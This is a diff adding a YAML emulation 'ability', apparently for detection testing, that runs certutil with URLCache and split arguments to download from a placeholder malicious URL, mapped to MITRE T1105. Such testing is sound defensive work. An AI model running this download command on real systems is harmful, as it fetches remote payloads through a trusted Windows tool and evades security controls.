@@ -1,0 +1,14 @@
+- name: CertUtil Download With URLCache and Split Arguments
+  id: ACDT0078
+  platforms:
+    windows:
+      executor:
+        name: cmd
+        command: certutil.exe -f -split -urlcache http://malicious-url.com
+      privilege: User
+  description: This ability simulates downloading files with certutil using URLCache
+    and split arguments to trigger DT0282.
+  tactic: Command and Control
+  technique:
+    id: T1105
+    name: Ingress Tool Transfer
